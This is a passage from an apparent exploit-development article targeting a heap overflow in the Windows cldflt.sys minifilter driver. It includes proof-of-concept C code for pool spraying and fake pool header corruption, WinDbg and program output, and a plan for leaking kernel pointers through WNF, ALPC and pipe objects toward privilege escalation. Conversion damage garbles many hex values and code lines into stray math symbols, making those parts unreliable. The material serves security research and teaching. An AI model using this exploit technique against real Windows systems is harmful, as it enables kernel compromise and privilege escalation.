printf(" $\[ + \]$ BlockSize $\\mathrel { \\phantom { = } } \\infty \\odot \\times \ I \\odot$ tells kernel this chunk is $\\Theta \\times \\bot \\Theta \\Theta$ bytes (was $\\Theta \\times 4 \\Theta$ )\\n"); int rc $=$ BuildAndSetCloudFilesReparsePoint(hFile, PAYLOAD\_SIZE\_OVERFLOW,\
\
if ( ${ \\mathsf { r c } } \\quad ! = \\quad \\odot ,$ ) { wprintf(L"\[-\] BuildAndSetCloudFilesReparsePoint failed\\n"); CloseHandle(hFile); CleanupEvents(spray\_events.get(), SPRAY\_COUNT); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1;\
\
} CloseHandle(hFile);\
\
printf("\\n\[+\] Overflow buffer placed in pool ( $\\Theta \\times 1 \\Theta \\Theta \\Theta$ bytes)\\n");\
\
DWORD targets $=$ RefillWithTargets(target\_events.get(), TARGET\_COUNT); if (targets $\\textless$ TARGET\_COUNT / 2) { printf("\[-\] Failed to create enough target Events\\n"); } else { printf("\[+\] Target Events positioned (hopefully adjacent to overflow buffer!)\\n"); }\
\
HANDLE hFile1 $=$ CreateFileW( filePath, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL\
\
);\
\
if (hFile1 $= =$ INVALID\_HANDLE\_VALUE) { wprintf(L"\[-\] Open file failed! error $=$ %lu\\n", GetLastError());\
\
}\
\
else { wprintf(L"\[+\] File reopened successfully, handle $=$ %p\\n", hFile1); CloseHandle(hFile1); printf("\[i\] File handle closed\\n");\
\
} printf("\\n\[!\] Press ENTER to cleanup and exit...\\n");\
\
getchar(); CleanupEvents(spray\_events.get(), SPRAY\_COUNT);\
\
CleanupEvents(target\_events.get(), TARGET\_COUNT); CfUnregisterSyncRoot(syncRootPath);\
\
wprintf(L"\[i\] Sync root unregistered\\n");\
\
CoTaskMemFree(appDataPath);\
\
printf( $" { \\setminus } \[ + \]$ All done! $\\mathsf { E x }$ ploit PoC completed.\\n");\
\
return ${ \\mathrm { ~ ~ \\omega ~ } } \_ { \\Gamma \\subset } = = 0$ ) ? 0 : 1;\
\
Comments follow:\
\
I have chosen creating 5000 Event objects and refill (into the holes) 1000 Event objects. I have also tried different values, but there was not any difference. While increasing the object refill size increases our chances of getting adjacent object, it also demands more processor time and even memory.\
\
▪ To try to keep the code organized, I created four new function and avoided touching on the existing code. Therefore, SprayEvents, CreateHoles, RefillWithTargets and CleanupEvent routines have been created. Actually, the last one is a safe measure and attempt to keep the system running without experimenting with instabilities. Regarding unstable conditions, certain stabilizing actions are performed throughout the code since the pool allocator might delay some tasks or skip them at a given moment due to asynchronous operations. Furthermore, processes like coalescing, as well as reorganizing the free list and lookaside list, can be time-consuming. If we have not done it, next allocations might land in unexpected location, which would provide us with a disorganized memory layout. As it was necessary to spray many objects and also refill those ones that have been freed, two event arrays have been created and initially set up to zero. In one of experiments, I left to initialize arrays with zero and had an unexpected collateral effect.\
\
▪ SprayEvents routine is the first step when CreateEventsW has been used to create a series of unnamed event objects. The arguments of the function say that these event objects are not inherited by eventual child process, it must be explicitly reset to returned to non-signaled state, they are created in non-signaled state and are unnamed. CreateHoles routine creates alternates holes in the memory sprayed layout by closing events using CloseHandle function. RefillWithTags creates new events which will be placed in the holes created by CreateHoles function. As a fake header would be created starting at the offset 0x1000, I created two markers before this point to make easier to spot the corrupted object. The fake pool header has the following details: the PreviousSize field contains an arbitrary value for the size of a previous pool chunk $0 \\times 0 4$ (what means $\\mathtt { 0 } \\mathtt { x } 4 0$ bytes), the PoolIndex field is zero (a default value), the BlockSize has changed to ${ 0 } { \\times 1 0 }$ to expand the size of the pool, the PoolType is $0 \\times 0 2$ (NonPagedPool), the PoolTag is the hexadecimal representation of “Even” and ProcessBilled is a marker. Note that a BlockSize field with 0x10 represents an effective size of 0x100 bytes (size $=$ BlockSize $^ { \* } \_ { 0 \\times 1 0 }$ ).\
\
▪ To prevent leaving the system on an unstable condition, all Event objects have been closed via CleanupEvents routine, which calls CloseHandle function.\
\
A sensitive point that has to be commented on this procedure is the order of tasks being executed by the program. The current order is:\
\
Spray Event objects Create holes Sleep (stabilization time)\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
Create reparse point Refill with new targets (Event objects) Trigger the vulnerability\
\
Eventually, a slight change to this order could be suggested:\
\
Spray Event objects\
\
Create holes\
\
Sleep (stabilization time)\
\
Refill holes with new targets (Event objects)\
\
Create reparse point\
\
Trigger the vulnerability\
\
According to target context, variations could be required. Theoretically the effect would be the same because the vulnerability is triggered by reading the reparse point at the end, but it is possible to notice that when the buffer overflow occurs before refilling holes (first scenario), the only remaining holes are refilled, including adjacent ones, and it increases chances of getting an object adjacent to the target buffer. Otherwise, in the second scenario, holes are filled before the overflow occurs, which can cause the overflow buffer to land in somewhere out of our control and, as result, decrease our chance of adjacency.\
\
The WinDbg output is as follows:\
\
0: kd> g\
\
Breakpoint 5 hit\
\
cldflt!HsmIBitmapNORMALOpen+0x6da:\
\
fffff807\`67dec5ea e8d1cefbff call cldflt!memcpy (fffff807\`67da94c0)\
\
1: kd> r rcx, rdx, r8d rcx=ffffa2880b1fe000 rdx=ffffa2880d7a80fc r8d=1010\
\
1: kd> db rdx+1000 L20 ffffa288\`0d7a90fc 04 00 10 02 45 76 65 6e-41 41 41 41 41 41 41 41 ....EvenAAAAAAAA ffffa288\`0d7a910c 00 00 00 00 e2 69 cf 7b-ef f0 ea f1 00 00 00 00 .....i.{...\
\
1: kd> dt nt!\_POOL\_HEADER rcx+1000 $+ \\Theta \\times \\Theta \\Theta \\Theta$ PreviousSize : 0y00000000 (0) $+ \\Theta \\times \\Theta \\Theta \\Theta$ PoolIndex : 0y00000000 (0) $+ \\Theta \\times \\Theta \\Theta 2$ BlockSize : 0y00000000 (0) $+ \\Theta \\times \\Theta \\Theta 2$ PoolType : 0y00000000 (0) $+ \\Theta \\times \\Theta \\Theta \\Theta$ Ulong1 0 $+ \\Theta \\times \\Theta \\Theta 4$ PoolTag 0 $+ \\Theta \\times \\Theta \\Theta 8$ ProcessBilled : (null) $+ \\Theta \\times \\Theta \\Theta 8$ AllocatorBackTraceIndex : 0 $+ \\Theta \\times \\Theta \\Theta \\alpha$ PoolTagHash : 0\
\
1: kd> p\
\
cldflt!HsmIBitmapNORMALOpen+0x6df:\
\
fffff807\`67dec5ef 8b4710 mov eax,dword ptr \[rdi+10h\]\
\
1: kd> db ffffa2880b1fe000+ff0 L20 ffffa288\`0b1feff0 ef be ad de ef be ad de-78 56 34 12 78 56 34 12 ..xV4.xV4. ffffa288\`0b1ff000 04 00 10 02 45 76 65 6e-41 41 41 41 41 41 41 41 ....EvenAAAAAAAA ffffa288\`0b1ff000 04 00 10 02 45 76 65 6e-41 41 41 41 41 41 41 41 ....EvenAAAAAAAA ffffa288\`0b1ff010 ff ff b0 74 f3 c3 82 c7-03 00 1f 00 00 00 00 00 ...t..\
\
1: kd> dt nt!\_POOL\_HEADER ffffa2880b1fe000+1000 $+ \\Theta \\times \\Theta \\Theta \\Theta$ PreviousSize : 0y00000100 (0x4) $+ \\Theta \\times \\Theta \\Theta \\Theta$ PoolIndex : 0y00000000 (0) $+ \\Theta \\times \\Theta \\Theta 2$ BlockSize 0y00010000 (0x10) $+ \\Theta \\times \\Theta \\Theta 2$ PoolType : 0y00000010 (0x2) $+ \\Theta \\times \\Theta \\Theta \\Theta$ Ulong1 : 0x2100004 $+ \\Theta \\times \\Theta \\Theta 4$ PoolTag : 0x6e657645 $+ \\Theta \\times \\Theta \\Theta 8$ ProcessBilled : 0x41414141\`41414141 \_EPROCESS $+ \\Theta \\times \\Theta \\Theta 8$ AllocatorBackTraceIndex : 0x4141 $+ \\Theta \\times \\Theta \\Theta \\alpha$ PoolTagHash : 0x4141\
\
Comments about this WinDbg output are as follows:\
\
The rcx register contains the destination buffer address. The rdx register contains the source buffer address.\
\
▪ The r8d register contains the length of the payload to be copied.\
\
▪ After executing the vulnerable instruction (memcpy), clearly we see the marker (0xdeadbeef) placed on offset 0xFF0. At the same way, we can see the fake pool headers built at offset 0x1000. You should note that it necessary to use the rcx value that was valid before executing the vulnerable code because it contains the destination buffer.\
\
The program output is as follows:\
\
C:\\Users\\Administrator\\Desktop\\RESEARCH>EVTCORRUPT.exe $\[ + \]$ Sync root directory ensured: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot $\[ + \]$ Sync root registered at C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\
\
$\[ \\star \]$ STAGE 1: Spraying 5000 Event objects...\
\
$\[ \+ \]$ Created 1000/5000 Events...\
\
$\[ \+ \]$ Created 2000/5000 Events...\
\
$\[ \+ \]$ Created 3000/5000 Events...\
\
$\[ \+ \]$ Created 4000/5000 Events...\
\
$\[ \+ \]$ Created 5000/5000 Events...\
\
$\[ \+ \]$ Successfully created 5000/5000 Event objects\
\
\[\*\] STAGE 2: Creating holes (freeing every other Event)... $\[ + \]$ Freed 2500 Event objects (created 2500 holes) $\[ + \]$ Pool now has 2500 holes ready for overflow buffer\
\
$\[ \\star \]$ Waiting 2 seconds for pool to stabilize.. \[i\] Existing file deleted: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06 $\[ + \]$ File created: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06\
\
$\[ \\star \]$ Crafting payload with EXTENDED pool header for overlap...\
\
$\[ \\star \]$ Placing corruption markers at offset 0xFF0:\
\
$\[ \+ \]$ Crafting fake POOL\_HEADER at offset $\\Theta \\times 1 \\Theta \\Theta \\Theta$ : $\[ \\star \]$ PreviousSize: 0x04 $\[ \\star \]$ PoolIndex: $\\Theta \\times \\Theta \\Theta$ \[\*\] BlockSize: 0x10 $\\mathtt { \\langle s i z e \ = \ 0 \\times 1 0 \ \\star \ 0 \\times 1 0 \ = \ 0 \\times 1 0 0 }$ bytes) \[\*\] PoolType: 0x02 (NonPagedPool) $\[ \\star \]$ PoolTag: 0x6e657645 ('Even')\
\
$\[ \\star \]$ ProcessBilled: 0x4141414141414141 (marker)\
\
$\[ \+ \]$ Fake header written at $\\boldsymbol { \\mathbf { r } } \\boldsymbol { \\mathbf { c } } \\boldsymbol { \\mathbf { \\kappa } } + \\boldsymbol { \\Theta } \\boldsymbol { \\times } \\boldsymbol { \\mathbf { 1 } } \\boldsymbol { \\Theta } \\boldsymbol { \\Theta } \\boldsymbol { \\Theta }$\
\
$\[ \+ \]$ BlockSize $\\tt { \\tt = 0 \\times 1 0 }$ tells kernel this chunk is $\\Theta \\times 1 \\Theta \\Theta$ bytes (was 0x40)\
\
$\[ \+ \]$ BtBufferSize: $\\Theta \\times 1 \\Theta 8 \\mathsf C$\
\
$\[ \+ \]$ BtRp header: \[-\] $+ \\Theta \\cal { 4 }$ : magic=0x70527442 \[-\] $+ \\Theta 8$ : crc=0x0DCBCFA0 \[-\] $+ \\infty C$ : ushortLen=4236 \[-\] $\\yen 10$ : flags=0x0002 \[-\] $\\yen 12$ : numberOfElements $\\mathtt { \\mathtt { = 5 } }$ \[-\] totalSize=4236\
\
\[+\] BtRpData bas $e = \\Theta \\times 3 C$ \[-\] elements\[0\]: type $\\mathtt { \\mathtt { \\mathtt { \\mathtt { \\mathtt { \\Lambda } = 0 \\times 0 7 } } } }$ len $^ { = 1 }$ off $\\therefore = Q \\times 6 \\textcircled { 2 }$ \[-\] elements\[1\]: type=0x07 len $^ { = 1 }$ off=0x64 \[-\] elements\[2\]: type=0x07 len $^ { = 1 }$ off $\\mathtt { \\backslash = 0 \\times 6 8 }$ \[-\] elements\[3\]: type $\\mathtt { \\Gamma } = \\Theta \\times \\Theta 6$ len $\\mathtt { = 8 }$ off=0x6C \[-\] elements\[4\]: type=0x11 len $=$ 4112 off $\\mathtt { = 0 } \\mathtt { x } 7 8$\
\
$\[ \+ \]$ FeRp size: 0x1108\
\
\[+\] FeRp header: \[-\] $+ \\Theta \\Theta$ : version=0x0001 \[-\] $+ \\textcircled { \\cdot } 2$ : structSize=4360 \[-\] $+ \\Theta \\cal { 4 }$ : magic=0x70526546 $+ \\Theta 8$ : crc=0x671AA53D \[ -\] $+ \\infty C$ : dwordLen=4356 \[-\] $\\yen 10$ : flags=0x0002 \[-\] $\\yen 12$ : max\_elements $\\tt { \\tt = 1 6 }$\
\
$\[ \+ \]$ Computed totalSize=4360 $\[ + \]$ FeRpData bas $\\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial }$ (reserved 10 descriptors) \[-\] elements\[0\]: type $\\mathtt { \\mathtt { \\mathtt { \\mathtt { \\mathtt { \\Lambda } = 0 \\times 0 7 } } } }$ len $^ { = 1 }$ off=0x60 \[-\] elements\[1\]: type $\\mathtt { \\Pi } = \\Theta \\times \\Theta \\mathsf { A }$ len $\\mathord { = } 4$ off $= 0 \\times 6 4$ \[-\] elements\[2\]: type=0x06 len $\\mathtt { = 8 }$ off $= 0 \\times 6 8$ \[-\] elements\[3\]: type=0x11 len $\\mathord { = } 4$ of $S = \\Theta \\times 6 C$ \[-\] elements\[4\]: type $\\mathtt { = 0 } \\mathtt { \\times 1 } 1$ len $=$ 4236 off $\\yen 0$ $\[ + \]$ Compressed FeRp size: 0x1DA\
\
$\[ \+ \]$ DeviceIoControl (FSCTL\_SET\_REPARSE\_POINT\_EX) succeeded (file) $\[ + \]$ GET\_REPARSE (file): tag=0x9000601A, len=478, total=486\
\
$\[ \+ \]$ Overflow buffer placed in pool (0x1000 bytes)\
\
$\[ \\star \]$ STAGE 3: Refilling holes with 1000 target Events...\
\
$\[ \+ \]$ Created 500/1000 target Events...\
\
$\[ \+ \]$ Created 1000/1000 target Events...\
\
$\[ \+ \]$ Successfully created 1000/1000 target Event objects\
\
$\[ \+ \]$ Target Events positioned (hopefully adjacent to overflow buffer!)\
\
$\[ \\star \]$ Waiting 1 second before triggering... $\[ + \]$ File reopened successfully, handle $=$ 0000000000003150 \[i\] File handle closed\
\
\[!\] Press ENTER to cleanup and exit...\
\
While we have corrupted and created a fake header using Event object, we could not leak kernel pointer only using Event objects because there are not available APIs for reading their content, which suggests that a good option would be to use object types that have associated with reading APIs (NtQueryWnfStateData function) like WNF State Name, which is not a kernel object, but this structure can be used for this exploitation purpose. As readers will learn in the next sub-section, WNF State Name structure has a DataSize field as one of its members, which turns out that it will be our target, when we will change it to a larger value to cover extra bytes that will be able to be read.\
\
It is time to move to the next subsection, which treats exactly on the leak subject.\
\
# 16.04. Leaking kernel pointers and structures\
\
The next goal is to leak kernel and structure pointers to create options for bypassing the ASLR and perform privilege escalation. I have mentioned that even though I have built previous programs to overwrite the next and adjacent pool chunk, we were focused on just overwriting bytes and creating a fake pool header, which worked as an introduction to the subject and, hopefully, will help readers to understand next paragraphs and subsection. Kernel or minifilter drivers offer a wide attack surface such as named pipes, ALPC ports, callbacks, and a series of other ones, and we need to understand what our options are before proceeding. Regardless of the taken path, it is significant to underscore that exploitation itself may not be the last operational step, and adoption of additional measures could be required to keep the target system stable (sometimes it is a complicated task) during and after the exploitation process, which can demands waiting for memory to settle up or cleaning allocations and handles left behind to prevent a system crash. Of course, not all binary exploitation requires a similar action, but we can never lose sight of this.\
\
A vulnerability overflow as the existing in this minifilter driver provides us possibility to overwrite data from adjacent allocations and build chunk overlapping, which they can be used individually or combined to obtain different primitives such as arbitrary reading, arbitrary writing and execution, and everything from this point onward depending on what objects we will use, how they will be laid on memory and how we will use these techniques to leak information what we need to. In most cases we will manipulate memory layout (grooming) before starting the exploitation to make events predictable, and this approach will be even repeated multiple times during the exploitation, but it is notorious that memory layout may be difficult to control because it changes over time.\
\
In general, and not specifically to these specific Windows versions or even this minifilter driver being researched, the following object types and structures could be useful alternatives:\
\
Event objects (\_KVEVENT), which can be allocated from NonPagedPool memory (same place of our pool primitive), sprayed and afterward read using NtQueryEvent function.\
\
Semaphores and Mutex (named as Mutant on Window notation), which have a similar approach to Event objects.\
\
Pipe Attributes that are not difficult to handle with, but demands attention on details\
\
Completion Ports, which are also allocated from NonPagedPool memory and easily sprayed. WNF (Windows Notification Facility) structures, which are suitable and useful used in heap spraying.\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
ALPC object, which sometimes can be a bit more complicated to understand, but it is a really powerful resource for exploits development.\
\
Note: events, semaphores, mutexes, completion ports and ALPC ports are represented as kernel objects and are exposed by the Windows Object Manager. WNF (specifically \_WNF\_STATE\_DATA structure that will be used ahead), is a kernel heap structure (a heap object), but not a kernel object. Later, I will refer to it as an object, but not as a kernel object.\
\
To shape the memory according to our objectives, we have to spray carefully chosen objects across the heap, but if we want to go a bit further to leak kernel and structure addresses, one of initial option will be \_WNF\_STATE\_DATA structure from WNF (Windows Notification Facility), which is an internal Windows kernel mechanism that has been used for publishing and subscribing to system state changes (like a notification board), as was explained previously. This structure offers the possibility of reading data content from user-space and writing directly into memory allocated on NonPagedPool, which makes a favorable choice to develop exploits because we can control exactly data and amount of data to be written, and data is also stored inside this structure exactly as we wrote. The mentioned structure allows us to follow the well-known memory shaping model that is spraying objects, poking holes, and finally refilling holes with objects (from the same type or not). The \_WNF\_STATE\_DATA structure contains a header (\_WNF\_NODE\_HEADER), a size field for allocated data (AllocatedSize), another data field that controls how much data is stored (DataSize) and finally the own input data (UserData). The described structure below follows:\
\
struct \_WNF\_STATE\_DATA { struct \_WNF\_NODE\_HEADER Header; // $\\Theta \\times \\Theta$ ULONG AllocatedSize; // $\\Theta \\times 4$ ULONG DataSize; // $\\Theta \\times \\Theta$ ULONG ChangeStamp; // $\\Theta \\times \\mathsf { C }$ UCHAR UserData\[\]; // Up to $\\Theta \\times 1 \\Theta \\Theta \\Theta$\
\
};\
\
struct \_WNF\_NODE\_HEADER { USHORT NodeTypeCode; USHORT NodeByteSize;\
\
};\
\
The only serious limitation is that \_WNF\_STATE\_DATA object holds up to $0 \\times 1 0 0 0$ bytes of data, but as we have handled this exact size of object since the beginning of the article, thereby it will not be a problem. Under the programming view, the WNF provides APIs to manage WNF structures such as NtCreateWnfStateName that allocates a WNF state name that represents a slot in the WNF state table, NtUpdateWnfStateData that is responsible for writing data inside of the WNF object and also triggers notification to any present subscriber that waiting for notifications, NtQueryWnfStateData returns the data buffer, size and current timestamp, and NtDeleteWnfStateName that deletes the WNF state name from the WNF table state if it is no longer necessary. The definitions of these functions are as follow below:\
\
NTSTATUS NtCreateWnfStateName( OUT PWNF\_STATE\_NAME StateName, IN WNF\_STATE\_NAME\_LIFETIME NameLifetime, IN WNF\_DATA\_SCOPE DataScope, IN BOOLEAN PersistData, IN OPTIONAL PWNF\_TYPE\_ID TypeId, IN ULONG MaximumStateSize,\
\
IN PSECURITY\_DESCRIPTOR SecurityDescriptor );\
\
NTSTATUS NtUpdateWnfStateData( IN PWNF\_STATE\_NAME StateName, IN OPTIONAL PVOID Buffer, IN ULONG Length, IN OPTIONAL PWNF\_TYPE\_ID TypeId, IN OPTIONAL PVOID ExplicitScope, IN WNF\_CHANGE\_STAMP MatchingChangeStamp, IN ULONG CheckStamp\
\
);\
\
NTSTATUS NtDeleteWnfStateData( IN PCWNF\_STATE\_NAME StateName, IN OPTIONAL CONST VOID $\\star$ ExplicitScope\
\
);\
\
As expected, one of normal exploitation approaches is to shape (grooming) the heap layout with \_WNF\_STATE\_DATA objects (also called WNF object) to prepare the memory layout for upcoming steps. Therefore, at the first step WNF objects must be allocated to fill up pool, which works like spray padding (or sacrificial objects) to catch eventual holes. Soon after the first spray, we have to free all of them to prepare a kind of clean segment and ensure that next allocations will be predictable and subsequent. Finally, a second spray of multiple WNF objects is performed to allocate objects in an organized and adjacent way. Afterwards, every other \_WNF\_STATE\_DATA object is freed, which creates a series of alternate holes, and initial memory configuration for overwriting and leak is ready. The next step is to fill these created holes with carefully chosen objects that offers us a real advantage of being “exploited” by reading from it or writing to it. The sequence of described actions is represented by the following scheme:\
\
▪ \[WNF\] \[HOLE\] \[WNF\] \[HOLE\] \[WNF\] \[HOLE\] \[WNF\] \[HOLE\] \[WNF\] \[HOLE\] \[WNF\] \[HOLE\] \[WNF\] \[WNF\] \[OBJ\] \[WNF\] \[OBJ\] \[WNF\] \[OBJ\] \[WNF\] \[OBJ\] \[WNF\] \[OBJ\] \[WNF\] \[OBJ\] \[WNF\]\
\
The next task is finding a suitable object to be used and stored in holes, and that is where one of tricks comes up because everything depends on the purpose and objective. One of my preferred options is ALPC (Advanced Procedure Call), which is quite an interesting IPC (Inter-Process Communication) mechanism on Windows, offers a structure named ALPC Handle Table (\_ALPC\_HANDLE\_TABLE) that is used for managing handles associated with ALPC ports, and definitely it could be an appropriate choice to fill the created holes. About handle tables, they are built when ALPC ports are created from a user-space program and hold handles to distinct resources such as ports and messages. The \_ALPC\_HANDLE\_TABLE structure, as shown below, contains a set of pointers to critical kernel structures, and it is this composition that makes this structure a good candidate to an exploit because we can try to leak kernel addresses from there and, consequently, it has the potential to open opportunities to reach elevation of privilege (also known as privilege escalation) because, as an example, the leaking of kernel pointers allows us to find the kernel base address and addresses of other critical kernel structures such as \_EPROCESS and \_TOKEN, which are actively used to this purpose.\
\
Spraying multiple ALPC ports (\_ALPC\_PORT) will allocate the respective number of ALPC handle tables, and each one has a determined size that can be adjusted to be used with WNF\_STATE\_DATA object. The ALPC\_HANDLE\_TABLE definition follows below:\
\
struct \_ALPC\_HANDLE\_TABLE { struct \_ALPC\_HANDLE\_ENTRY\* Handles; // $\\Theta \\times \\Theta$ struct \_EX\_PUSH\_LOCK Lock; // $\\Theta \\times \\Theta$ ULONGLONG TotalHandles; // $\\Theta \\times \\bot \\Theta$ ULONG Flags; // $\\Theta \\times \\bot 8$\
\
};\
\
# This structure makes part of an arrangement:\
\
ALPC\_PORT\
\
▪ HandleTable: ALPC\_HANDLE\_ENTRY\[\]\
\
▪ PortAttributes\
\
▪ CommunicationInfo\
\
▪ Incoming \| Pending \| Canceled Queues\
\
▪ Security $^ +$ Sync fields\
\
Once we know that ALPC is a good and potential choice for holes, the general mode and exploitation steps can be rewritten:\
\
Spray a first set of WNF objects to fill up pool, which works like spray padding (or sacrificial objects). That is an optional but recommended step and depends on the system conditions. Free all of them to prepare a kind of clean segment and ensure that next allocations will be predictable and subsequent. That is step is associated with the previous one. Spray a second set of WNF objects to allocate objects in an organized and adjacent way. Free every other \_WNF\_STATE\_DATA object, which creates a series of alternate holes. Create multiple ALPC ports, which will force allocations of \_ALPC\_HANDLE\_TABLE objects. As discussed previously, such objects contain kernel pointers addresses that are valuable for us. The Handles array, which is the first member of \_ALPC\_HANDLE\_TABLE object, and not the handle object itself will refill holes in the memory pool, and we will have:\
\
\[WNF\] \[hnd\_array\] \[WNF\] \[hnd\_array\] \[WNF\] \[hnd\_array\] \[WNF\] \[hnd\_array\] \[WNF\] ▪ Using the existing cldflt.sys overflow vulnerability we can overwrite the beginning of the next \_WNF\_STATE\_DATA object, which contains AllocatedSize and DataSize fields.\
\
There is a subtle detail at this point. The \_WNF\_STATE\_DATA structure supports at its DataSize field with a maximum of 0x1000 bytes. Despite this, we want the whole WNF object has 0x1000 (total), we will have to consider that the WNF header has 0x10 bytes, then the maximum value will be 0xFF0 bytes $( 0 { \\mathsf { x F F O } } + 0 { \\mathsf { x 1 0 } } = = 0 { \\mathsf { x 1 0 0 0 } } )$ , and it makes it a suitable object with a perfect fit for created holes. Later, if we change the attributed value of DataSize and AllocateSize to 0xFF8, the pool allocator still sees $0 \\times 1 0 0 0$ allocation, but the WFN code thinks it has 0xFF8 of valid data, and we will be able to read or write first 8 bytes of the next object, depending on the adjacent object, which can be the already mentioned ALPC object (\_ALPC\_HANDLE\_TABLE object). In other words, we are using the same vulnerability to read or write 8 bytes of the next object, and whatever this object is. To locate the corrupted WFN object, one of options is resort to our previous PoC and remember we also have setup a field with value 0xC0DE, which is WNF object’s ChangeStamp. Once we find the WNF object, we also find the target ALPC, which is the next and target object. Obviously, things are not easy as they seem to be and also there are traps along the path.\
\
[https://exploitreversing.com](https://exploitreversing.com/)\
\
▪ Therefore, and as it has already stated, if we can read the ALPC object then we can also retrieve pointers to kernel and well-known structures, and use then to reach the elevation of privilege.\
\
It is essential to underscore that steps above compose a few of possible (from many ones) procedures that can be adopted and, as you can predict, they can be extensive and complex. We already know that using ALPC is an advantage because it allows us to leak kernel pointers (one of ways to confirm if it is a kernel pointer is to test the address using return (((ULONG\_PTR)ptr & 0xFFFF000000000000ULL) $= =$ 0xFFFF000000000000ULL;))to structures like tokens, and there are an considerable amount of details that we need to handle with, which some will discussed in the next paragraphs and other ones will be explained in the exploit development part.\
\
If readers pay attention to the \_ALPC\_HANDLE\_TABLE structure, it does not take $0 \\times 1 0 0 0$ bytes that would fit the hole perfectly because it is initially allocated with a much smaller size than it. Nonetheless, a key property of the Handles array member of ALPC handle table is exactly the capability of growing dynamically as more handles to resources are added, and its rule and way of growing is by doubling the previous size allocation. We can force the Handles array to grow by adding more handle entries (AlpcAddHandleTableEntry function) and, when the array is full, the system (kernel) will trigger its internal mechanism to grow such array.\
\
This methodology works and might be used by itself, but it can be improved. There is a structure named \_KALPC\_RESERVE that works as a resource reservation object used to pre-allocate (reserve) space for ALPC resources, which is useful for us because it contains a handle to ALPC port and the structure itself is allocated in the kernel pool, as we really need to. To use the \_KALPC\_RESERVE structure in the exploitation context, we need to invoke NtAlpcCreateResourceReserve to trigger \_KALPC\_RESERVE allocation, and this will force Handles array to expand itself. To explain the statement, even though the initial size of Handles array from \_ALPC\_HANDLE\_TABLE structure is small, successive allocations of new KALPC\_RESERVE objects (ALPC resources) will force such Handles array member to run out of space, which will cause it double its space. As a direct consequence, it will be reallocated with this new size to another location. If we repeat this methodology several times, the Handles array will reach around 0x1000 bytes (or close), and when it is reallocated, it will fill the created holes created in the memory layout because they also have $0 \\times 1 0 0 0$ bytes. At the end, this technique is valuable because it provides enough control of the size, it is deterministic and it is controllable from the user space. On the other hand, it could takes up considerable space for memory, take time and also make the pool fragmented.\
\
In terms of functions, we need NtAlpcCreatePort (creates ALPC port), NtAlpcCreateResourceReserve (allocates \_KALPC\_RESERVE structure, which is managed by \_ALPC\_HANDLE\_TABLE, and that ensures that there is enough buffer space to receive a message) and AlpcAddHandleTableEntry (adds new entries into handle table, and in specific into Handles array, which force it to grow up) to implement this approach and also the mentioned \_KALPC\_RESERVE structure. All of them are shown below:\
\
NTSTATUS\
\
NtAlpcCreatePort( _Out_ PHANDLE PortHandle, _In_ POBJECT\_ATTRIBUTES ObjectAttributes, _In\_opt_ PALPC\_PORT\_ATTRIBUTES PortAttributes\
\
);\
\
# NtAlpcCreateResourceReserve(\
\
_Out_ PHANDLE ResourceId, _In_ HANDLE PortHandle, _In_ ULONG Flags, _In_ SIZE\_T MessageSize );\
\
# NTSTATUS AlpcAddHandleTableEntry(\
\
_Inout_ PALPC\_HANDLE\_TABLE HandleTable, _In_ HANDLE Handle, _In_ PVOID Object, _In_ ULONG Flags, _Out_ PALPC\_HANDLE\_ENTRY \*Entry );\
\
struct \_KALPC\_RESERVE { struct \_ALPC\_PORT\* OwnerPort; // 0x00 struct \_ALPC\_HANDLE\_TABLE\* HandleTable; // 0x08 VOID\* Handle; // 0x10 struct \_KALPC\_MESSAGE\* Message; // $\\Theta \\times \\bot 8$ ULONGLONG Size; // $\\Theta \\times 2 \\Theta$ LONG Active; // $\\Theta \\times 2 8$\
\
};\
\
The first member of KALPC\_RESERVE structure is a pointer to an ALPC port, which may leak a pointer to ALPC\_PORT structure. Adopting the same idea, we can leak a pointer to the handle table (\_ALPC\_HANDLE\_TABLE) from the second member and a pointer to \_KALPC\_MESSAGE from the fourth member. All these potential leaks make KALPC\_RESERVE structure a valuable structure, and this fact will be confirmed in the exploit.\
\
No doubts, \_ALPC\_HANDLE\_TABLE and the \_KALPC\_RESERVE structures are welcome resources to exploitation, but they are not the options that are available. Other well-known resources are named pipe and anonymous pipes (generally called Pipes), which we can create and consequently allocate them in memory as well as we can manage the respective size of the allocation. Personally, I think Pipe attributes are simpler than ALPC because they do not requires control of the object's growth, permit specifying the exact size value (0x1000 bytes, as we need), there is a small number of APIs, and can be enough and faster than ALPC alternative. The common Pipe functions used for exploitation are CreatePipe, which creates and returns a pair anonymous pipe for reading and writing, and NtFsControlFile, which sends FSCTL (file system control code -- FSCTL\_PIPE\_PEEK, FSCTL\_PIPE\_WAIT and FSCTL\_PIPE\_QUERY\_CLIENT\_PROCESS, for example) to query or even set pipe attributes. Both functions help us to trigger kernel operations on proposed pipe objects, including potential kernel pointer dereferencing, and leak pointers like \_EPROCESS and token (\_TOKEN), in particular. Except by the PipeAttribute structure (reversed and proposed by Corentin Bayet and Paul Fariello), the functions shown below are public:\
\
# struct PipeAttribute {\
\
LIST\_ENTRY list; char $\\star$ AttributeName; uint64\_t AttributeValueSize; char\* AttributeValue; char data\[0\]; };\
\
// $\+ \\odot \\times \\odot \\odot$ : Doubly-linked list entry (16 bytes) // $+ \\odot \\times \\perp \\odot$ : Pointer to attribute name string // $+ \\odot \\times \\perp 8$ : Size of attribute value // $+ \\odot \\times 2 \\odot$ : Pointer to attribute value data // $+ \\odot \\times 2 8$ : Flexible array member (inline data)\
\
# BOOL CreatePipe(\
\
PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY\_ATTRIBUTES lpPipeAttributes, DWORD nSize );\
\
